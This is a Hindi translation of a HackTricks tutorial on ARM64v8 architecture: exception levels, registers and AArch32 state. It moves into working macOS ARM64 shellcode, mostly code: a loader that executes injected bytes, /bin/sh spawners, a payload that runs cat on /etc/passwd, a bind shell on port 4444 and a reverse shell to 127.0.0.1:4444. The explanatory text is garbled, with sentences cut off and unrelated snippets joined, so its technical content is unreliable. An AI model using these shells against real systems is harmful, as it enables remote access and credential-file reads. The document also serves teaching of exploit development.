# ARM64v8 का परिचय

<details>

<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी कंपनी की **विज्ञापनित करना चाहते हैं HackTricks** में या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, **The PEASS Family** खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## **अपवाद स्तर - EL (ARM64v8)**

ARMv8 वास्तुकला में, अवज्ञान स्तरों को, जिन्हें अपवाद स्तर (ELs) के रूप में जाना जाता है, निष्पादन पर्यावरण की विशेषाधिकार स्तर और क्षमताएँ परिभाषित करते हैं। चार अपवाद स्तर हैं, EL0 से EL3 तक, प्रत्येक एक विभिन्न उद्देश्य की सेवा करते हैं:

1. **EL0 - उपयोगकर्ता मोड**:
* यह सबसे कम विशेषाधिकृत स्तर है और सामान्य एप्लिकेशन कोड को निष्पादित करने के लिए उपयोग किया जाता है।
* EL0 पर चल रहे एप्लिकेशन एक-दूसरे से और सिस्टम सॉफ़्टवेयर से अलग होते हैं, जो सुरक्षा और स्थिरता को बढ़ाता है।
2. **EL1 - ऑपरेटिंग सिस्टम कर्नेल मोड**:
* अधिकांश ऑपरेटिंग सिस्टम कर्नेल इस स्तर पर चलते हैं।
* EL1 में EL0 से अधिक विशेषाधिकार होते हैं और सिस्टम संसाधनों तक पहुंच सकते हैं, लेकिन कुछ प्रतिबंध हैं ताकि सिस्टम की पूर्णता सुनिश्चित हो।
3. **EL2 - हाइपरवाइजर मोड**:
* यह स्तर वर्चुअलाइजेशन के लिए उपयोग किया जाता है। EL2 पर चल रहा हाइपरवाइजर एक ही भौतिक हार्डवेयर पर चल रहे कई ऑपरेटिंग सिस्टम (प्रत्येक अपने खुद के EL1 में) का प्रबंधन कर सकता है।
* EL2 वर्चुअलाइजेशनीय परिवेशों की अलगाव और नियंत्रण की सुविधाएँ प्रदान करता है।
4. **EL3 - सुरक्षित मॉनिटर मोड**:
* यह सबसे विशेषाधिकृत स्तर है और अक्सर सुरक्षित बूटिंग और विश्वसनीय निष्पादन परिवेशों के लिए उपयोग किया जाता है।
* EL3 सुरक्षित और गैर-सुरक्षित स्थितियों के बीच पहुंच और नियंत्रण को प्रबंधित कर सकता है (जैसे सुरक्षित बूट, विश्वसनीय ओएस, आदि)।

इन स्तरों का उपयोग विभिन्न प्रणालियों को प्रबंधित करने के लिए एक संरचित और सुरक्षित तरीके से अनुमानित करने की अनुमति देता है, उपयोगकर्ता एप्लिकेशन से सबसे विशेषाधिकृत सिस्टम सॉफ़्टवेयर तक। ARMv8 का विशेषाधिकार स्तरों का दृष्टिकोण सिस्टम के विभिन्न घटकों को पूरी तरह से अलग करने में मदद करता है, जिससे सिस्टम की सुरक्षा और मजबूती में सुधार होता है।

## **रजिस्टर (ARM64v8)**

ARM64 में **31 सामान्य उद्देश्य रजिस्टर** हैं, `x0` से `x30` तक लेबल किए गए हैं। प्रत्येक एक **64-बिट** (8-बाइट) मान स्टोर कर सकता है। 32-बिट मानों के लिए आवश्यकता होने पर, एक ही रजिस्टर को 32-बिट मोड में एक्सेस किया जा सकता है, नाम w0 से w30 तक।

1. **`x0`** से **`x7`** - इन्हें सामान्यत: स्क्रैच रजिस्टर्स के रूप में और सबरूटीन्स को पारंपरिक पैरामीटर्स पास करने के लिए उपयोग किया जाता है।
* **`x0`** एक फ़ंक्शन के रिटर्न डेटा को भी लेता है
2. **`x8`** - लिनक्स कर्नेल में, `x8` `svc` इंस्ट्रक्शन के लिए सिस्टम कॉल नंबर के रूप में उपयोग किया जाता है। **macOS में x16 का उपयोग किया जाता है!**
3. **`x9`** से **`x15`** - अधिक सामयिक रजिस्टर, अक्सर स्थानीय चरों के लिए उपयोग किया जाता है।
4. **`x16`** और **`x17`** - **इंट्रा-प्रोसेडुरल कॉल रजिस्टर**। तत्काल मूल्यों के लिए अस्थायी रजिस्टर। ये अंधकारित फ़ंक्शन कॉल्स और PLT (Procedure Linkage Table) स्टब्स के लिए भी उपयोग किए जाते हैं।
* **`x16`** **macOS** में **`svc`** इंस्ट्रक्शन के लिए **सिस्टम कॉल नंबर** के रूप में उपयोग किया जाता है।
5. **`x18`** - **प्लेटफ़ॉर्म रजिस्टर**। इसे एक सामान्य उद्देश्य रजिस्टर के रूप में उपयोग किया जा सकता है, लेकिन कुछ प्लेटफ़ॉर्मों पर, यह रजिस्टर प्लेटफ़ॉर्म-विशेष उपयोगों के लिए सुरक्षित बूट में वर्तमान धागे पर्यावरण ब्लॉक के लिए आवंटित किया जाता है।
6. **`x19`** से **`x28`** - ये कॉली-सेव्ड रजिस्टर हैं। एक फ़ंक्शन को अपने कॉलर के लिए इन रजिस्टरों के मानों को संरक्षित करना चाहिए, इसलिए वे स्टैक में स्टोर किए जाते हैं और कॉलर के पास वापस जाने से पहले पुनर्प्राप्त किए जाते हैं।
7. **`x29`** - **फ्रेम पॉइंटर** स्टैक फ्रेम का पता रखने के लिए। जब एक नया स्टैक फ्रेम बनाया जाता है क्योंकि एक फ़ंक्शन कॉल किया जाता है, **`x29`** रजिस्टर को स्टैक में स्टोर किया जाता है और नया फ्रेम पॉइंटर पता (**`sp`** पता) इस रजिस्ट्री में स्टोर किया जाता है।
* यह रजिस्टर एक **सामान्य उद्देश्य रजिस्टर** के रूप में भी उपयोग किया जा सकता है हालांकि यह आम तौर पर **स्थानीय चरों** के संदर्भ के रूप में उपयोग किया जाता है।
8. **`x30`** या **`lr`**- **लिंक रजिस्टर**। जब `BL` (Branch with Link) या `BLR` (Branch with Link to Register) इंस्ट्रक्शन को निष्पादित किया जाता है, तो **`pc`** मान को इस रजिस्टर में स्टोर करके **वापसी पता** रख
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **वापसी**: `ret` (लिंक रजिस्टर में पते का उपयोग करके कॉलर को नियंत्रण वापस करता है)

## AARCH32 निष्पादन स्थिति

Armv8-A 32-बिट कार्यक्रमों का निष्पादन समर्थन करता है। **AArch32** एक **दो निर्देश सेट** में चल सकता है: **`A32`** और **`T32`** और **`इंटरवर्किंग`** के माध्यम से उनमें स्विच कर सकता है।\
**विशेषाधिकारी** 64-बिट कार्यक्रम 32-बिट के निम्न विशेषाधिकृत स्तर में स्थानांतरण कर सकते हैं।\
ध्यान दें कि 64-बिट से 32-बिट की परिवर्तन विशेषाधिकृत स्तर के निम्न होते हैं (उदाहरण के लिए, EL1 में एक 64-बिट कार्यक्रम एल0 में एक कार्यक्रम को ट्रिगर करना)। यह किया जाता है **`SPSR_ELx`** विशेष रजिस्टर के **बिट 4 को 1** सेट करके जब `AArch32` प्रक्रिया धागा निष्पादित होने के लिए तैयार होता है और शेष `SPSR_ELx` में **`AArch32`** कार्यक्रम CPSR को संग्रहित करता है। फिर, विशेषाधिकृत प्रक्रिया **`ERET`** निर्देश को कॉल करती है ताकि प्रोसेसर **`AArch32`** में परिवर्तित होकर A32 या T32 में प्रवेश करे **।**

**`इंटरवर्किंग`** J और T बिट्स का उपयोग करके होता है। `J=0` और `T=0` का मतलब है **`A32`** और `J=0` और `T=1` का मतलब है **T32**। यह मूल रूप से इसे दर्शाता है कि निर्देश सेट T32 है।\
यह **इंटरवर्किंग शाखा निर्देशों** के दौरान सेट किया जाता है, लेकिन जब पीसी को गंतव्य रजिस्टर के रूप में सेट किया जाता है, तो यह अन्य निर्देशों के साथ सीधे सेट किया जा सकता है। उदाहरण: 

एक और उदाहरण:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### रजिस्टर

16 32-बिट रजिस्टर हैं (r0-r15). **r0 से r14** तक वे **किसी भी ऑपरेशन** के लिए उपयोग किया जा सकता है, हालांकि कुछ रिजर्व्ड होते हैं:

* **`r15`**: कार्यक्रम काउंटर (हमेशा). अगले निर्देश का पता रखता है। A32 में current + 8, T32 में, current + 4।
* **`r11`**: फ्रेम पॉइंटर
* **`r12`**: इंट्रा-प्रोसेडरियल कॉल रजिस्टर
* **`r13`**: स्टैक पॉइंटर
* **`r14`**: लिंक रजिस्टर

इसके अतिरिक्त, रजिस्टर **`बैंक्ड रजिस्ट्रीज`** में बैकअप किए जाते हैं। ये जगह हैं जो रजिस्टर मानों को संग्रहीत करती हैं जो अपशिष्ट हैं, अपशिष्ट हैं और विशेषाधिकारीय कार्यों में त्वरित संदर्भ परिचालन करने की अनुमति देती हैं ताकि हर बार रजिस्टर सहेजने और पुनर्स्थापित करने की आवश्यकता न हो।\
यह **`CPSR` से `SPSR`** में प्रोसेसर मोड की प्रक्रिया की स्थिति को सहेजने के द्वारा किया जाता है जिसे अपशिष्ट लिया जाता है। अपशिष्ट लौटने पर, **`CPSR`** को **`SPSR`** से पुनर्स्थापित किया जाता है।

### CPSR - वर्तमान कार्यक्रम स्थिति रजिस्टर

AArch32 में CPSR AArch64 में **`PSTATE`** के रूप में काम करता है और जब किसी अपशिष्ट को लिया जाता है तो यह बाद में पुनर्स्थापित करने के लिए **`SPSR_ELx`** में भी संग्रहीत होता है:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

क्षेत्रों को कुछ समूहों में विभाजित किया गया है:

* एप्लिकेशन प्रोग्राम स्थिति रजिस्टर (APSR): अंकगणित ध्वज और EL0 से एक्सेस किया जा सकता है
* प्रक्रिया व्यवहार रजिस्टर: प्रक्रिया व्यवहार (ओएस द्वारा प्रबंधित)।

#### एप्लिकेशन प्रोग्राम स्थिति रजिस्टर (APSR)

* **`N`**, **`Z`**, **`C`**, **`V`** ध्वज (जैसे AArch64 में)
* **`Q`** ध्वज: यह जब किसी विशेषित सीमांकित अंकगणित निर्देश के क्रियान्वयन के दौरान **पूर्णांक संतुलन होता है** तो 1 पर सेट किया जाता है। एक बार यह **`1`** पर सेट हो जाता है, तो यह अपनी मान को बनाए रखेगा जब तक यह मैन्युअल रूप से 0 पर सेट नहीं होता। इसके अतिरिक्त, इसकी मान की जांच करने वाला कोई निर्देश नहीं है, इसे मैन्युअल रूप से पढ़कर करना होगा।
* **`GE`** (अधिक या बराबर) ध्वज: यह SIMD (एकल निर्देश, एकाधिक डेटा) ऑपरेशन में उपयोग किया जाता है, जैसे "समानांकन जोड़" और "समानांकन घटाना"। ये ऑपरेशन एक ही निर्देश में कई डेटा बिंदुओं को प्रसंस्करण करने की अनुमति देते हैं।

उदाहरण के लिए, **`UADD8`** निर्देश **चार जोड़ों को बाइट में जोड़ता है** (दो 32-बिट ऑपरेंड से) समानांकन और परिणामों को एक 32-बिट रजिस्टर में संग्रहीत करता है। फिर यह इन परिणामों के आधार पर **`APSR`** में `GE` ध्वज सेट करता है। प्रत्येक GE ध्वज एक बाइट जोड़ने के लिए एक का अनुसरण करता है, यह दर्शाता है कि उस बाइट जोड़ने के लिए जोड़ने का परिणाम **ओवरफ्लो** हुआ है या नहीं।

**`SEL`** निर्देश इन GE ध्वजों का उपयोग शर्तानुसार क्रियाएँ करने के लिए करता है।

#### प्रक्रिया व्यवहार रजिस्टर

* **`J`** और **`T`** बिट: **`J`** 0 होना चाहिए और यदि **`T`** 0 है तो इस्तेमाल किया जाता है A32 निर्देश सेट, और यदि यह 1 है, तो T32 का उपयोग किया जाता है।
* **IT ब्लॉक स्थिति रजिस्टर** (`ITSTATE`): ये 10-15 और 25-26 से बिट हैं। ये एक **`IT`** प्रिफिक्स ग्रुप के भीतर निर्देशों के लिए स्थितियाँ संग्रहीत करते हैं।
* **`E`** बिट: **एंडियनेस** को दर्शाता है।
* **मोड और अपशिष्ट मास्क बिट** (0-4): वर्तमान निष्पादन स्थिति निर्धारित करते हैं। पांचवां वाला यह दर्शाता है कि कार्यक्रम 32-बिट (1) या 64-बिट (0) के रूप में चल रहा है। अन्य 4 वर्तमान में उपयोग में लाए जा रहे अपशिष्ट मोड को दर्शाते हैं (जब एक अपशिष्ट होता है और इसे संभाला जा रहा है)। संख्या सेट **वर्तमान प्राथमिकता** को दर्शाती है यदि इसे संभालते समय एक और अपशिष्ट ट्रिगर होता है।

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: कुछ अपशिष्ट को बंद किया जा सकता है उपयोग करके बिट **`A`**, `I`, `F`. यदि **`A`** 1 है तो इसका अर्थ है कि **असमकालिक अबॉर्ट्स** ट्रिगर होंगे। **`I`** बाह्य हार्डवेयर **इंटरप्ट रिक्वेस्ट्स** (IRQs) का जवाब देने के लिए कॉन्फ़िगर करता है। और F **फास्ट इंटरप्ट रिक्वेस्ट्स** (FIRs) से संबंधित है।
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
कभी-कभी **`libsystem_kernel.dylib`** से **डिकंपाइल** कोड की जाँच करना स्रोत कोड की जाँच से आसान होता है क्योंकि कई सिसकॉल्स (बीएसडी और मैक) का कोड स्क्रिप्ट्स के माध्यम से उत्पन्न किया जाता है (स्रोत कोड में टिप्पणियों की जाँच करें) जबकि dylib में आप देख सकते हैं कि क्या कॉल किया जा रहा है।
{% endhint %}

### शैलकोड

कॉम्पाइल करने के लिए:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
बाइट्स को निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>शैलकोड का परीक्षण करने के लिए सी कोड</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### शैल

[**यहाँ से**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) लिया गया है और समझाया गया है।

{% tabs %}
{% tab title="adr के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% टैब शीर्षक = "स्टैक के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### cat के साथ पढ़ें

उद्देश्य है `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को execute करना है, इसलिए दूसरा तर्क (x1) पैरामीटरों का एक एरे है (जिसका मतलब है कि मेमोरी में ये पतों का एक स्टैक है)।
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### एक फोर्क से एसएच के साथ कमांड को आमंत्रित करें ताकि मुख्य प्रक्रिया को मार नहीं दिया जाए
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### बाइंड शैल

बाइंड शैल [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) में **पोर्ट 4444** से
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### रिवर्स शैल

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) से, **127.0.0.1:4444** के लिए रिवशैल।
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

दूसरे तरीके HackTricks का समर्थन करने के लिए:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** के [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>
